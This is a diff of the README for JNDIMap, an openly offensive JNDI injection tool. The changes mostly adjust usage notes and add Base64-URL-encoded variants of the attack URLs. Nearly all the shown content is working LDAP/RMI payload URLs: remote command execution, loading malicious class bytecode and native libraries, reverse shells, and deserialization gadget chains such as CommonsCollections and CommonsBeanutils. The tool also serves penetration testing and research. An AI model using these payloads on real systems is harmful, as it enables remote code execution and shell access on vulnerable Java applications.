@@ -17,7 +17,7 @@ Features
 
 ## Build
 
-There are no releases yet, so you need to build it manually
+There are no releases yet, so you need to build it manually (JDK 8)
 
 ```bash
 git clone https://github.com/X1r0z/JNDIMap
@@ -49,7 +49,7 @@ Usage: java -jar JNDIMap.jar [-i <ip>] [-r <rmiPort>] [-l <ldapPort>] [-p <httpP
 
 Please note that all the Base64 passed in is **Base64 URL encoded**, i.e. replace `+` and `/` with `-` and `_`
 
-All routes that can execute commands support automatic Base64 URL decoding, that is, you can directly pass in plain text commands or Base64 URL encoded commands
+Most parameters support automatic Base64 URL decoding, that is, you can directly pass in plain text (command/IP/port/URL) or Base64 URL encoded content (some routes only accept Base64 URL encoded parameters, which will be specially noted below)
 
 The following routes support both RMI and LDAP protocols except `/Deserialize/*` (LDAP deserialization)
 
@@ -64,20 +64,22 @@ The Java version must be less than 8u121 (RMI protocol) or 8u191 (LDAP protocol)
 ```bash
 # DNS request
 ldap://127.0.0.1:1389/Basic/DNSLog/xxx.dnslog.cn
+ldap://127.0.0.1:1389/Basic/DNSLog/eHh4LmRuc2xvZy5jbg==
 
-# execute command (support automatic Base64 URL decoding)
+# execute command
 ldap://127.0.0.1:1389/Basic/Command/open -a Calculator
 ldap://127.0.0.1:1389/Basic/Command/b3BlbiAtYSBDYWxjdWxhdG9y
 
 # load custom class bytecode
 
 # load via URL parameters
-ldap://127.0.0.1:1389/Basic/FromCode/<base64-java-bytecode>
+ldap://127.0.0.1:1389/Basic/FromCode/<base64-url-encoded-java-bytecode>
 # load from the server running JNDIMap
-ldap://127.0.0.1:1389/Basic/FromPath/<base64-path-to-evil-class-file>
+ldap://127.0.0.1:1389/Basic/FromPath/<base64-url-encoded-path-to-evil-class-file>
 
 # native reverse shell (Windows supported)
 ldap://127.0.0.1:1389/Basic/ReverseShell/127.0.0.1/4444
+ldap://127.0.0.1:1389/Basic/ReverseShell/MTI3LjAuMC4x/NDQ0NA==
 ```
 
 ### Bypass
@@ -123,7 +125,7 @@ Please note that the path passed in is an absolute path and cannot contain the f
 For example: if `/tmp/evil.so` exists on the server, the path is `/tmp/evil`
 
 ```bash
-ldap://127.0.0.1:1389/NativeLibLoader/<base64-path-to-native-library>
+ldap://127.0.0.1:1389/NativeLibLoader/<base64-url-encoded-path-to-native-library>
 ```
 
 source code of the native library, written in C
@@ -320,11 +322,10 @@ JNDIMap has built-in the following gadgets, and also supports custom data deseri
 
 ```bash
 # custom data deserialization
-ldap://127.0.0.1:1389/Deserialize/<base64-serialize-data>
+ldap://127.0.0.1:1389/Deserialize/<base64-url-encoded-serialize-data>
 
 # CommonsCollectionsK1 deserialization (3.1 + TemplatesImpl), supports command execution and native reverse shell
 ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/Command/open -a Calculator
-ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/Command/b3BlbiAtYSBDYWxjdWxhdG9y
 ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/ReverseShell/127.0.0.1/4444
 
 # CommonsCollectionsK2 deserialization (4.0 + TemplatesImpl), same as above
@@ -332,7 +333,6 @@ ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK2/Command/open -a Calculato
 
 # CommonsCollectionsK3 deserialization (3.1 + Runtime.exec), only supports command execution
 ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK3/Command/open -a Calculator
-ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK3/Command/b3BlbiAtYSBDYWxjdWxhdG9y
 
 # CommonsCollectionsK4 deserialization (4.0 + Runtime.exec), same as above
 ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK4/Command/open -a Calculator
@@ -343,12 +343,10 @@ ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK4/Command/open -a Calculato
 
 # 1.8.3
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils183/Command/open -a Calculator
-ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils183/Command/b3BlbiAtYSBDYWxjdWxhdG9y
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils183/ReverseShell/127.0.0.1/4444
 
 # 1.9.4
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/Command/open -a Calculator
-ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/Command/b3BlbiAtYSBDYWxjdWxhdG9y
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/ReverseShell/127.0.0.1/4444
 
 # Jackson native deserialization
